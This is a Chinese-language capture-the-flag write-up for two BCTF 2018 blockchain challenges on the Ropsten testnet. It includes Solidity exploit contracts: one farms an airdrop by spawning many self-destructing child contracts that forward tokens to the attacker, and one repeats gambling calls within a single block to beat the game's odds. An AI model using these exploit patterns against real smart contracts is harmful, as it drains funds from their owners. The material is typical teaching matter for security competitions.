# bctf 2018 blockchain

## Fake3d
题目地址：0xd229628fd201a391cf0c4ae6169133c1ed93d00a @ ropsten
薅羊毛攻击：
```js
contract father {
    function father() payable {}
    Son son;
    function attack(uint256 times) public {
        for(uint i=0;i<times;i++){
            son = new Son();
        }
    }
    function () payable {
    }
}

contract Son {

    function Son() payable {
        Fake3D f3d;
        f3d=Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);
        f3d.airDrop();
        if (f3d.balance(this)>=10)
        {
            f3d.transfer(0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f,10);
        }
        selfdestruct(0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f);
    }
    function () payable{
    }
}
```
攻击完成后，提取flag时发现不对劲，有问题，怀疑winnerlist合约不对，找到了该合约真正的地址，并继续逆向：
https://ethervm.io/decompile?address=0xd229628fd201a391cf0c4ae6169133c1ed93d00a&network=ropsten
简单来说，还需要满足用户的地址最后为0x43或倒数2位为0xb1. 用https://vanity-eth.tk/
爆破，得到地址，转账，获取flag。

## EOSGAME
题目地址：0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F @ ropsten

赌博游戏，赌就行了，写个攻击合约在一个block里面多赌几次。20%中100倍奖励，很划算
```js
contract EOSGame_exp{
    EOSGame eosgame;
    
    constructor() public{
        eosgame=EOSGame(0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F);
    }
    
    function init() public{
        eosgame.initFund();
    }
    
    function small(uint times) public{
        for(uint i = 0; i < times; i++) {
            eosgame.smallBlind();
        }
    }
    
    function big(uint times) public{
        for(uint i = 0; i < times; i++) {
            eosgame.bigBlind();
        }
    }
    
    function bof() public view returns(uint256){
        return eosgame.eosBlanceOf();
    }
    
    function flag(string b64email) public{
        eosgame.CaptureTheFlag(b64email);
    }
}
```